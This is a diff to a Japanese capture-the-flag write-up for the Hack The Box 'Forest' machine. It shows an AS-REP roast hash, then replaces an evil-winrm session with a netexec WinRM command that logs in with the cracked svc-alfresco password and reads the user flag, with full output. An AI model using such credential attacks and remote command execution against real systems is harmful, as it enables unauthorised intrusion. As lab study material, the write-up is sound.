@@ -108,17 +108,13 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:f6124c873f10f1072f283b194fe7d7ad$f87e6e54a9
 ```
 取得したクレデンシャルでwinrmログイン成功！ユーザフラグゲット
 ```sh
-└─$ evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
-                                        
-Evil-WinRM shell v3.7
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cat C:\Users\svc-alfresco\Desktop\user.txt
-b52be94e8c18f9cdabcfb7709a922a97
+└─$ netexec winrm 10.129.95.210 -u svc-alfresco -p s3rvice -X 'type C:\Users\svc-alfresco\Desktop\user.txt'         
+WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
+WINRM       10.129.95.210   5985   FOREST           [+] Executed command (shell type: powershell)
+WINRM       10.129.95.210   5985   FOREST           99cd42423fed1b4653b90355bcd52c11
 ```
 
 
